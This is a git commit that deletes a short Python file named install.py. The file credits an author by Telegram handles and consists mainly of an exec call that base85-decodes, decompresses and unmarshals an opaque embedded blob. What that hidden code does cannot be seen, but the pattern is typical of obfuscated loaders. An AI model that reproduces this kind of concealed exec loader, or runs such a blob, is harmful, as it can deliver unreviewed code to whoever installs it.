1e3b26e9df80c98a532271c771b1b00910c5a13e
elf <87319528+elf-cyber@users.noreply.github.com>
2022-01-08 15:34:34 +0330

    Delete install.py

--- install.py
+++
@@ -1,5 +0,0 @@
-#Coded By : Elf
-#My Channel Telegram : @ELf_security_cyber
-#My ID Telegram : @e_l_f_6_6_6
-import marshal, zlib, base64
-exec(marshal.loads(zlib.decompress(base64.b85decode(b'c${reu};G<5IsAIlNQvOfuXQfs0m`ODkOG<#DK^aaz?3?#F3q-#48J*k&gV5|A1d$!cN12xYND!y=R|Km%|^M*|@c#J}e+0DIo<813`Kq1UN+x{dbyr+#7rhM$Q|80}#+>R%IAkm2qa($f-|IZwNTo3)?5e*~Fe6*=MNfHT?JTs33WS)%?rNcCRlI%-ZY-xv1in%c^@zlGk0yRZ@tGYbLuoR)wb7mA-8Hwh;BQ$&}g)iR<b9Zyh(i4&#?h6*4y@(<kn@oEprw%Sl>Ah6-hZyuh6_zG!%DeD|dZ_Hx(Sl$S#BG;rLFVX9XxuRcM#WsdM2J@o54**C3;HkH7x<Xh^td~P8k^U)(hEiMSN*&(yl4}aNccm'))))
